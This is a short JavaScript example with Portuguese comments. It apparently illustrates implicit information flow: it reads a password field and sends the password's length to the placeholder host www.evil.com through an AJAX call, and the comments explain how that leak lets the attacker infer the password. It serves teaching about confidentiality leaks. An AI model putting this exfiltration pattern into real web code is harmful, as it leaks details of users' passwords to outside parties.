var revelaH = function(h) {
	// Uma pista sobre o valor do parâmetro <h>, tido como confidencial,
	// é propagada para o domínio www.evil.com:
	var pista = h.length;
	
	// Embora o valor <h> não tenha sido propagado, uma característica
	// implícita do seu conteúdo foi revelada. 

	makeAjaxCall('www.evil.com/tell/hint?passwordLength=' + pista);
	// Agora, www.evil.com sabe o tamanho da senha utilizada, e pode usar essa
	// informação para fazer uma inferência sobre a senha utilizada.
}

var h = document.getElementById('password').value;
revelaH(h);